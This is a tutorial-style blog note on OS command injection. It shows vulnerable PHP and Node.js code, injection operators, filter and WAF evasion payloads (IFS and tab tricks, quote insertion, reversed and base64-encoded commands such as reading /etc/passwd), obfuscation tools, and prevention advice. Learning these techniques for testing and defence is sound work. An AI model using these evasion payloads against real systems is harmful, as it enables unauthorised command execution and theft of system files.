---
title: Notes | Command Injections
author: Zeropio
date: 2022-07-29
categories: [Notes, Vulnerabilities]
tags: [injection]
permalink: /notes/vulnerabilities/command-injections
---

A Command Injection vulnerability is among the most critical types of vulnerabilities. It allows us to execute system commands directly on the back-end hosting server, which could lead to compromising the entire network. Injection vulnerabilities are considered the number 3 risk in OWASP's Top 10. Injection occurs when user-controlled input is misinterpreted as part of the web query or code being executed, which may lead to subverting the intended outcome of the query to a different outcome that is useful to the attacker. The following are some of the most common types of injections:

| **Injection**   | **Description**    |
|--------------- | --------------- |
| OS Command Injection | Occurs when user input is directly used as part of an OS command |
| Code Injection | Occurs when user input is directly within a function that evaluates code |
| SQL Injections | Occurs when user input is directly used as part of an SQL query |
| Cross-Site Scripting/HTML Injection | Occurs when exact user input is displayed on a web page |

There are many other types of injections other than the above, like LDAP injection, NoSQL Injection, HTTP Header Injection, XPath Injection, IMAP Injection, ORM Injection...

All programming language has function to run commands in the machine. For example, in PHP there are `exec`, `system`, `shell_exec`, `passthru` or `popen`. The following code is an example of PHP code that is vulnerable to command injections:
```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

As the user input from the filename parameter in the GET request is used directly with the touch command, the web application becomes vulnerable to OS command injection. The same occur in Node.js:
```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

---

# Exploitation 

## Detection 

To inject an additional command to the intended one, we may use any of the following operators:

| **Injection Character**    | **URL-Encoded Character**    | **Executed Command**    |
|---------------- | --------------- | --------------- |
| `;` | `%3b` | Both |
| `\n` | `%0a` | Both |
| `&` |	`%26` | Both (second output generally shown first) |
| `|` | `%7c` | Both (only second output is shown) |
| `&&` | `%26%26` | Both (only if first succeeds) |
| `||` | `%7c%7c` | Second (only if first fails) |
| \`\` | `%60%60` | Both (Linux-only) |
| `$()` | `%24%28%29` | Both (Linux-only) |

We would write our expected input, then use any of the above operators, and then write our new command. In general, all of these operators can be used for command injections regardless of the web application language, framework, or back-end server. 

> The only exception may be the semi-colon `;`, which will not work if the command was being executed with **CMD**, but would still work if it was being executed with **Windows PowerShell**.
{: .prompt-alert}

## Injecting Commands 

We can add a `;` after the input, and the run our command (`...; whoami`). If the web doesn't allow to include special character check the Network tab in the Developer Tools. Resend the input, if there aren't any new request it is the frontend the one who does the validation. It is very common for developers only to perform input validation on the front-end while not validating or sanitizing the input on the back-end.

To bypass this protection we can capture the request with Burp. There we can modify our input as we want.

---

# Filter Evasion 

## Identifying Filters

### Filter/WAF Detection 

There is no a certain way to detect a WAF. If our request are being evade It may be because of one. If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF.

### Blacklisted Characters 

A web application can have a black list of characters, something similar to:
```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

## Bypassing Space Filters 

Most of the injection operators are indeed blacklisted. However, the new-line character is usually not blacklisted, as it may be needed in the payload itself. Once we have found a operator that can go through we can start our attack `...%0a whoami`.

Probably, the space is also blacklisted. Even though, there are ways to bypassing it:
- **Using Tabs **: using tabs (`%09`) instead of spaces is a technique that may work. The payload will be `...%0a%09whoami`.
- **Using $IFS** (Linux Environment Variable): if we use ${IFS} where the spaces should be, the variable should be automatically replaced with a space. The payload will be `...%0a${IFS}whoami`.
- **Using Brace Expansion**: automatically adds spaces between arguments wrapped between braces, as follows: `{ls,-la}`. So the payload will be: `...%0a{ls,-la}`.

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) have even more bypassing techniques.

## Bypassing Other Blacklisted Characters 

A very commonly blacklisted character is the slash (`/`) or backslash (`\`) character, as it is necessary to specify directories in Linux or Windows. 

### Linux 

One such technique we can use for replacing slashes (or any other character) is through **Linux Environment Variables** like we did with `${IFS}`. While `${IFS}` is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and we can specify start and length of our string to exactly match this character. For example, the variable **$PATH**.
```console
zero@pio$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

To get the slash:
```console
zero@pio$ echo ${PATH:0:1}

/
```

> Don't add **echo** when using it.
{: .prompt-info}

The same can be done with other variables, like **$HOME** or **$PWD**:
```console
zero@pio$ echo ${LS_COLORS:10:1}

;
```

> The `printenv` prints all the environment variables on Linux.
{: .prompt-tip}

Our payload could be: `...${LS_COLORS:10:1}${IFS}...`.

### Windows 

The same concept work on Windows as well. For example, in the **CMD** we can use the variable **%HOMEPATH**:
```console
C:\zeropio> echo %HOMEPATH:~6,-11%

\
```

> The number may change depends on the username.
{: .prompt-alert}

With the **PowerShell**:
```console
PS C:\zeropio> $env:HOMEPATH[0]

\
```

> We can also use the `Get-ChildItem Env:` to print all the variables.
{: .prompt-tip}

### Character Shifting 

The following Linux command shifts the character we pass by **1**. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:
```console
zero@pio$ echo $(tr '!-}' '"-~'<<<[)

\
```

## Bypassing Blacklisted Commands 

Sometimes web applications has a blacklist of commands. The following code will do it:
```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like Bash or PowerShell and will execute the same command as if they were not there. Some of these characters are a single-quote `'` and a double-quote `"`, in addition to a few others. For the `whoami` command:
```console
zero@pio$ w'h'o'am'i
zero@pio$ w"h"o"am"i
```

The important things to remember are that we **cannot mix types of quotes** and the **number of quotes must be even**.

For Linux only, we can use other characters like `\` and `$@`, but in this case **the number of characters do not have to be even**:
```console
zero@pio$ who$@ami
zero@pio$ w\ho\am\i
```

For Windows only we can use `^`:
```console
C:\zeropio> who^ami
```

## Advanced Command Obfuscation 

### Case Manipulation 

One command obfuscation technique we can use is case manipulation, like inverting the character cases of a command (`WHOAMI`) or alternating between cases (`WhOaMi`). If we are dealing with a Windows server, we can change the casing of the characters of the command and send it. However, when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word. One working command we can use is the following:
```console
zero@pio$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

Other example could be:
```bash
$(a="WhOaMi";printf %s "${a,,}")
```

> Remember the previous filter, like the blacklisted space
{: .prompt-tip}

### Reversed Commands 

In this case, we will be writing `imaohw` instead of `whoami` to avoid triggering the blacklisted command.
```console
zero@pio$ echo 'whoami' | rev 
zero@pio$ $(rev<<<'imaohw')
```

The same can be in Windows:
```console
C:\zeropio> "whoami"[-1..-20] -join ''
C:\zeropio> iex "$('imaohw'[-1..-20] -join '')"
```

### Encoded Commands 

We can utilize various encoding tools, like `base64` or `xxd`. Let's take base64 as an example. First, we'll encode the payload we want to execute:
```console
zero@pio$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
zero@pio$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

> Using `<<<` to avoid using the filtered `|`
{: .prompt-info}

the same can be done on Windows:
```console
C:\zeropio> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

## Evasion Tools 

### Bashfuscator - Linux 

You can download it from [Github](https://github.com/Bashfuscator/Bashfuscator). We can start by simply providing the command we want to obfuscate with the -c flag:
```console
zero@pio$ ./bashfuscator -c 'cat /etc/passwd'
```

However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to over a million characters:
```console
zero@pio$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

We can now test the outputted command with `bash -c ''`, to see whether it does execute the intended command:
```console
zero@pio$ bash -c '...'
```

### DOSfuscation - Windows 

We can download it from [Github](https://github.com/danielbohannon/Invoke-DOSfuscation). 
```console
PS C:\zeropio> Invoke-DOSfuscation
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

---

# Prevention 

### System Commands 

We should always avoid using functions that execute system commands, especially if we are using user input with them. Instead of using system command execution functions, we should use built-in functions that perform the needed functionality.

### Input Validation 

Whether using built-in functions or system command execution functions, we should always validate and then sanitize the user input. In PHP can be used with the `filter_var` function:
```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

The same can be achieved with JavaScript for both the front-end and back-end:
```javascript
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```

### Input Sanitization 

The most critical part for preventing any injection vulnerability is input sanitization, which means removing any non-necessary special characters from the user input. We can use `preg_replace` to remove any special characters from the user input:
```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

The same with JavaScript:
```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

Or with DOMPurify library:
```javascript
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

### Server Configuration 

We should make sure that our back-end server is securely configured to reduce the impact in the event that the webserver is compromised. Some of the configurations we may implement are:
- Use the web server's built-in Web Application Firewall, in addition to an external WAF
- Abide by the **Principle of Least Privilege** (**PoLP**) by running the web server as a low privileged user
- Prevent certain functions from being executed by the web server 
- Limit the scope accessible by the web application to its folder 
- Reject double-encoded requests and non-ASCII characters in URLs

